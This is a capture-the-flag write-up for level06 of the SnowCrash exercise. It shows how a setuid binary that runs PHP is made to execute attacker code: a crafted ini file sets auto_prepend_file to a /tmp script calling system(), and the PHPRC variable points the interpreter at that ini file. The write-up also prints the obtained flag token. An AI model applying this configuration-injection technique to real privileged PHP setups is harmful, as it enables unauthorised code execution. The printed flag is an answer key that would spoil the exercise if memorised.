# FLAG06

```bash
level06@SnowCrash:~$ ll
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
-r-x------  1 level06 level06  675 Apr  3  2012 .profile*
```

We scp ```level06``` into our local to put him into ```dogbolt```

```bash
scp -P 4241 level06@localhost:/home/user/level06/level06 level06
```

the bin and a php file would put us to the path of regex but we know an easy vulnerability because the bin have root privilege and execute php.

## Using auto_prepend_file

auto_prepend_file in php.ini specifies a PHP file that PHP will always execute before executing the intended PHP script.

Setting this to /tmp/hack.php ensures your PHP code runs first, allowing arbitrary code execution.

```bash
echo '<?php system("/bin/getflag"); exit; ?>' > /tmp/hack.php
echo "auto_prepend_file=/tmp/hack.php" > /tmp/myphp.ini
```

## PHP configuration override (PHPRC exploit)

PHP uses PHPRC environment variable to override its default configuration file (php.ini).

By setting PHPRC to a custom location (/tmp/myphp.ini), the PHP interpreter used by level06 will read your custom configuration instead of the default one.

```bash
export PHPRC=/tmp/myphp.ini
./level06 
```

Which yields this token-looking token: ```wiok45aaoguiboiki2tuin6ub```
